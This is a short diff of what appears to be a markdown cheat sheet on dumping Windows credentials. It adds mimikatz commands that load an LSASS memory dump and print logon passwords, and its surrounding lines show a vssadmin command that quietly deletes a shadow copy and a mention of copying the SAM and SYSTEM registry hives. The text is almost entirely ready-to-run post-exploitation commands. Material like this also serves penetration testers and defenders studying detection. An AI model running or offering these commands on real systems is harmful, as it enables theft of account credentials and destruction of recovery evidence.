@@ -57,6 +57,12 @@ Don't forget to delete the shadows, {e0331775-2d51-48dc-817e-007a5b97b885} is th
 ```
 vssadmin delete shadows /shadow={e0331775-2d51-48dc-817e-007a5b97b885} /quiet
 ```
+#### minidump
+
+```
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
 
 We can also copy sam and system file from reg key
 
